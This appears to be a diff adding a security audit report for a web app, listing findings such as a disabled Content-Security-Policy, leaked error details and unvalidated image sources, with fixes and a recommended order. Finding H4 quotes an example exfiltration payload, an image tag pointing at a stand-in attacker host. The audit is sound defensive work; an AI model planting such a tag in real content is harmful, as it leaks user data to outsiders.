@@ -1,0 +1,153 @@
+Security Audit Report — Horus Scope
+Date: 10 March 2026
+
+Overall Assessment: GOOD — Strong fundamentals with actionable improvements
+
+The httpOnly cookie migration is correctly implemented. The remaining findings are categorized below.
+
+================================================================================
+HIGH Priority
+================================================================================
+
+H1. Content-Security-Policy Disabled
+  File: server/index.js:94 — helmet({ contentSecurityPolicy: false })
+
+  CSP is the last line of defense against XSS. With it disabled, any DOMPurify
+  bypass would allow script execution.
+
+  Fix: Enable a strict CSP policy.
+
+H2. Error Messages Leak Internal Details
+  File: server/index.js (multiple routes) and api/vulnerabilities.js
+
+  error.message is returned in 500 responses. Database errors, library internals,
+  and stack context can leak via the message field.
+
+  Fix: Return only generic error strings in production; log the real error
+  server-side.
+
+H3. JWT Algorithm Not Explicitly Set
+  File: server/lib/auth.js — jwt.sign() calls don't specify { algorithm: 'HS256' }
+
+  The jsonwebtoken library defaults to HS256 which is correct, but not specifying
+  it leaves the door open to algorithm confusion attacks if the library behavior
+  ever changes.
+
+  Fix: Add algorithm: 'HS256' to all jwt.sign() and jwt.verify() options.
+
+H4. DOMPurify Allows src on <img> Without Validation
+  File: src/components/NewsFeed/NewsModal.jsx:23-24
+
+  ALLOWED_ATTR includes src, but only href is validated by isSafeUrl(). A
+  compromised RSS feed could inject <img src="https://attacker.com/exfil?data=...">
+  for tracking/exfiltration.
+
+  Fix: Either remove img/src from the allowlists, or add a DOMPurify hook to
+  validate image sources.
+
+================================================================================
+MEDIUM Priority
+================================================================================
+
+M1. Missing Rate Limiting on Public Data Endpoints
+  File: server/index.js
+
+  GET /api/vulnerabilities, GET /api/cloud-status, GET /api/status, and
+  GET /api/health have no rate limiting. These could be abused for DoS or
+  reconnaissance.
+
+M2. /api/status Exposes Internal State Unauthenticated
+  File: server/index.js:822-831
+
+  Returns isRefreshing, uptime, lastRefreshResult to anyone. Useful for attackers
+  to profile the system's refresh cycles and detect weaknesses.
+
+  Fix: Either put behind requireAuth or strip sensitive fields.
+
+M3. Unbounded regions Query Parameter Parsing
+  File: server/index.js:709-716
+
+  The cloud-status regions param is split without length limits. An attacker could
+  send a very long string to cause excessive CPU in parsing loops.
+
+  Fix: Add a max-length check on the raw query parameter.
+
+M4. resend-verification Has No Rate Limit
+  File: server/index.js:405
+
+  Authenticated users can spam verification emails.
+
+  Fix: Add a rate limiter (e.g., 3 per 15 minutes).
+
+M5. Password Reset Token Race Condition
+  File: server/lib/auth.js
+
+  The SELECT then UPDATE pattern for marking tokens as used could be exploited
+  under high concurrency.
+
+  Fix: Use a single atomic query: UPDATE ... WHERE used = FALSE RETURNING *.
+
+M6. Dependency Vulnerabilities
+  npm audit reports 4 vulnerabilities (1 high in rollup, 2 moderate in
+  esbuild/qs, 1 low). The rollup path-traversal issue is build-time only.
+
+  Fix: npm audit fix or upgrade Vite.
+
+================================================================================
+LOW Priority
+================================================================================
+
+L1. User Email Stored in localStorage
+  File: src/services/authService.js:38
+
+  The user object (including email) is stored in localStorage for display. While
+  non-secret, email is PII accessible to any XSS.
+
+L2. No SRI on Google Fonts
+  File: index.html:12
+
+  External font loaded without Subresource Integrity hash.
+
+L3. Console Logging in Production
+  Multiple service files log debug info (cache state, date ranges) that could aid
+  reconnaissance.
+
+L4. SSL Certificate Validation Disableable
+  File: server/lib/db.js
+
+  DB_SSL_REJECT_UNAUTHORIZED=false env var disables DB cert validation. No
+  guardrail to prevent this in production.
+
+================================================================================
+Positive Findings (What's Done Well)
+================================================================================
+
+  Area                                              Status
+  ------------------------------------------------  -----------
+  Password hashing (bcrypt 12 rounds)               Strong
+  Refresh token stored as SHA-256 hash in DB        Strong
+  Refresh token rotation on use                     Implemented
+  httpOnly/Secure/SameSite cookie for refresh token Implemented
+  Access token in memory only (not localStorage)    Implemented
+  Parameterized SQL queries throughout              Consistent
+  Timing-safe comparisons (bcrypt, API key)         Correct
+  Rate limiting on login/signup/forgot-password     Configured
+  Email verification required before login          Enforced
+  12+ char password with complexity requirements    Enforced
+  CORS with credentials properly configured         Correct
+  DOMPurify for RSS/news HTML sanitization          Present
+  No eval(), innerHTML, document.write              Clean
+  No hardcoded secrets in source                    Verified
+  .env in .gitignore                                Verified
+
+================================================================================
+Recommended Fix Order
+================================================================================
+
+  1. Enable CSP (H1) — highest security ROI
+  2. Sanitize error messages (H2) — straightforward
+  3. Explicit JWT algorithm (H3) — one-line fix
+  4. Restrict DOMPurify img/src (H4) — small change
+  5. Add rate limiters to public endpoints (M1) — reuse existing pattern
+  6. Protect /api/status (M2) — add auth or strip fields
+  7. Run npm audit fix (M6) — dependency hygiene
